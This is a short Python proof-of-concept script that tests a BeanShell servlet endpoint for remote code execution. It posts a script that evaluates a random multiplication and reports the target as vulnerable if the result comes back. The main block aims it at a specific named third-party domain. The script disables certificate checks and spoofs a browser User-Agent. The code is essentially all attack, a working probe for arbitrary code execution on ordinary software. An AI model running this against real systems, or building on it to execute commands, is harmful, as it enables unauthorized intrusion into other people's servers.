import requests, re, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def randomInt(s, e):
    import random
    key = random.randint(int(s), int(e))
    return key


r1 = randomInt(8000, 9999)
# def randomInt(s,e):
# 	import random
# 	key=random.randint(int(s),int(e))
# 	return key
r2 = randomInt(8000, 9999)


def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    target_url = url + "/servlet/~ic/bsh.servlet.BshServlet"
    body = "bsh.script=print%28" + str(r1) + "*" + str(r2) + "%29%3B"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = requests.post(target_url, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and str(r1 * r2) in response.text:
        return target_url
    else:
        return False


if __name__ == '__main__':
    print(doCheck("http://edoc.aeonlife.com.cn/"))